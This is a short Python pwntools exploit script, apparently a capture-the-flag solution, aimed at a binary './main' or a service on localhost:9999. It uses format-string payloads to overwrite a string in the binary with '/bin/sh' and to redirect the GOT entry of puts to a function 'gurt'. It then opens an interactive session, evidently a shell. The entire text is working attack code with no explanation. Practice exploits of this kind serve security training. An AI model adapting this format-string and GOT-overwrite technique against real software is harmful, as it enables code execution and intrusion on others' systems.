from pwn import *

context.arch = 'amd64'
binary = ELF("./main")

if "REMOTE" in args:
    p = remote("localhost", "9999")
else:
    p = process(binary.path, stdout=PIPE)

thing = next(binary.search(b"Thank"))
print(hex(thing))

p.sendline(b"1")
payload = fmtstr_payload(5, {thing: 0x0068732f6e69622f}, overflows=128, write_size='byte')
p.sendline(payload)

p.sendline(b"1")
payload = fmtstr_payload(5, {binary.got["puts"]: binary.sym["gurt"]}, overflows=128, write_size='byte')
p.sendline(payload)

p.sendline(b"2")

p.interactive()